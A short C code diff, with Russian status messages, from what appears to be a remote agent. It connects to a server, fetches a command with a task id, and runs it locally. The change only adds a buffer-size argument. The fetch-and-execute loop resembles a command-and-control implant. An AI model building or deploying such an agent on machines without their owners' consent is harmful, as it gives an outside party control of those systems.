@@ -21,7 +21,7 @@ int main() {
         printf("Подключение к серверу...\n");
         if(active_channel->init() == 0) {
             printf("К серверу подключен...\n");
-            if(active_channel->get_command(command, task_id,  sizeof(command), agent_id) == 0) {
+            if(active_channel->get_command(command, task_id,  sizeof(command), sizeof(task_id), agent_id) == 0) {
                 active_channel->cleanup();
                 execute_command(command, result, sizeof(result));
                 sleep(1);
